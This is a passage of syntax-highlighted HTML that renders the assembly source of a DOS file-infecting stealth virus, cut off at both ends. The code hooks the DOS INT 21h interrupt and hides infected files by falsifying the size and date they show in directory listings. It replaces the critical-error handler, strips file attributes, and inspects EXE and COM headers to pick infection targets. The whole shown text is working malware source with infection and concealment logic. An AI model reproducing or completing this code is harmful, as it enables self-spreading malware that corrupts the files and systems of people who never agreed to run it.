                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">19h</span><span class="sc0">                          </span><span class="sc1">; to size and date</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                           </span><span class="sc1">; depending on the</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">                              </span><span class="sc1">; function call</span><span class="sc0">
</span><span class="sc5">correct_dta</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">200d</span><span class="sc0">           </span><span class="sc1">; check date if file</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">notinfected</span><span class="sc0">                     </span><span class="sc1">; is infected</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">200d</span><span class="sc0">           </span><span class="sc1">; sub years</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc5">virus_lenght</span><span class="sc0">   </span><span class="sc1">; and virus size</span><span class="sc0">
        </span><span class="sc6">sbb</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">notinfected</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                   </span><span class="sc1">; anyway make it succesfull</span><span class="sc0">
</span><span class="sc5">exit_err_ff</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">                      </span><span class="sc1">; restore and return back</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">return_from_int</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc5">corr_off1112</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc0">                  </span><span class="sc1">; offset to years for 11h/12h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                    </span><span class="sc1">; offset to file length</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">correct_dta</span><span class="sc0">

</span><span class="sc5">int21h_handler</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">func_21h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_payload</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4eh</span><span class="sc0">                  </span><span class="sc1">; findfirst dta</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ff_fn_stealth</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4fh</span><span class="sc0">                  </span><span class="sc1">; findnext dta</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ff_fn_stealth</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">11h</span><span class="sc0">                  </span><span class="sc1">; findfirst fcb</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ff_fn_stealth</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc0">                  </span><span class="sc1">; findnext fcb</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ff_fn_stealth</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">                  </span><span class="sc1">; read from file</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">read_from_file_jj</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">57h</span><span class="sc0">                  </span><span class="sc1">; get/set file date</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">get_set_date_jj</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4bh</span><span class="sc0">                  </span><span class="sc1">; exec</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">could_infect</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3dh</span><span class="sc0">                  </span><span class="sc1">; open file</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">could_infect</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">6ch</span><span class="sc0">                  </span><span class="sc1">; extended open file</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">could_infect</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">43h</span><span class="sc0">                  </span><span class="sc1">; get/set file attrib</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">could_infect</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">                  </span><span class="sc1">; close file</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">could_infect</span><span class="sc0">
</span><span class="sc5">chain_old21h</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0eah</span><span class="sc0">                    </span><span class="sc1">; jmp far ptr</span><span class="sc0">
</span><span class="sc5">old_int21h</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">40F8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">19h</span><span class="sc0">

</span><span class="sc5">return_from_int</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
                </span><span class="sc6">retf</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">

</span><span class="sc5">get_set_date_jj</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">get_set_date</span><span class="sc0">

</span><span class="sc5">read_from_file_jj</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">read_from_file</span><span class="sc0">
</span><span class="sc5">exit_wcch</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">bf_close_exit</span><span class="sc0">
</span><span class="sc5">could_infect</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">6ch</span><span class="sc0">                  </span><span class="sc1">; extended open?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_ext_open</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                    </span><span class="sc1">; open/replace if exist?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">ok_extended</span><span class="sc0">             </span><span class="sc1">; if not continue</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">back_inf</span><span class="sc0">
</span><span class="sc5">infect_file</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d00h</span><span class="sc0">                </span><span class="sc1">; open file</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">87h</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">not_opened_ext</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">chk_extsuch</span><span class="sc0">             </span><span class="sc1">; check extension and if isn't</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">exit_wcch</span><span class="sc0">               </span><span class="sc1">; already infected with years</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">close_file</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">back_inf_w24</span><span class="sc0">
</span><span class="sc5">not_opened_ext</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">back_inf_w24</span><span class="sc0">
</span><span class="sc5">ok_extended</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
</span><span class="sc5">not_ext_open</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                   </span><span class="sc1">; to ivt</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">the_24h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">24h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc0">              </span><span class="sc1">; to int24h handler</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">cli</span><span class="sc0">
                </span><span class="sc6">movsw</span><span class="sc0">                           </span><span class="sc1">; save int24h handler</span><span class="sc0">
                </span><span class="sc6">movsw</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">hnd_24h</span><span class="sc0">  </span><span class="sc1">; and set virus one</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc0">              </span><span class="sc1">; to virus segment</span><span class="sc0">
                </span><span class="sc6">sti</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">                  </span><span class="sc1">; close?</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">not_windoze</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">fname_dx</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">fname_ds</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d00h</span><span class="sc0">                </span><span class="sc1">; open the file in r/o</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">87h</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">not_opened_ext</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">close_file</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">                </span><span class="sc1">; get attribs and save</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">87h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_attrib</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                   </span><span class="sc1">; delete attribs</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">87h</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">infect_file</span><span class="sc0">             </span><span class="sc1">; error here? retry from start</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d02h</span><span class="sc0">                </span><span class="sc1">; open for rw</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">87h</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">func_21h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">4bh</span><span class="sc0">  </span><span class="sc1">; was executing?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_windoze</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_sft</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">],</span><span class="sc12">'IW'</span><span class="sc0">       </span><span class="sc1">; windows executing?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_windoze</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">22h</span><span class="sc4">],</span><span class="sc12">' N'</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_windoze</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; on exec parameter block</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">0ah</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">lds</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; lenght of cmdline</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">5</span><span class="sc0">         </span><span class="sc1">; correct lenght of cmdline</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">                      </span><span class="sc1">; after original cmdline</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc12">'D/'</span><span class="sc0">      </span><span class="sc1">; so append /D:FC + cr</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc12">'F:'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">0d43h</span><span class="sc0">
</span><span class="sc5">not_windoze</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; file handle</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">file_handle</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">chk_extsuch</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">bf_close_exit</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">bad_file_xit</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">                </span><span class="sc1">; get file time/date</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">87h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">file_time</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">      </span><span class="sc1">; save time/date</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">file_date</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_fname</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">                  </span><span class="sc1">; read from file</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1ch</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">original_file</span><span class="sc0"> </span><span class="sc1">; 1ch from file head</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">87h</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">bad_file_xit</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                    </span><span class="sc1">; goto end of file</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">move_cxdx0</span><span class="sc0">              </span><span class="sc1">; gives in DX:AX length</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; first two bytes</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc12">'MZ'</span><span class="sc0">                 </span><span class="sc1">; exe?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">is_an_exe</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc12">'ZM'</span><span class="sc0">                 </span><span class="sc1">; exe?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">is_an_exe</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc12">'EL'</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">bad_file_xit</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc12">'EN'</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">bad_file_xit</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                   </span><span class="sc1">; &gt; 64k is ok</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">bad_file_xit</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">60000d</span><span class="sc0">               </span><span class="sc1">; not 60000 &gt; 64k bad for coms</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">bad_file_xit</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1eh</span><span class="sc0">                  </span><span class="sc1">; not too small even</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">bad_file_xit</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">com_infect_part</span><span class="sc0">
</span><span class="sc5">bad_file_xit</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">closef_exit</span><span class="sc0">
</span><span class="sc5">is_a_close2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">back_inf_w24</span><span class="sc0">
</span><span class="sc5">bf_close_exit</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_ifclose</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">is_a_close2</span><span class="sc0">             </span><span class="sc1">; close if needed and exit</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">close_file</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">pre_21h_exit</span><span class="sc0">
</span><span class="sc5">is_an_exe</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">; ax,dx rem=dx:ax/reg</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
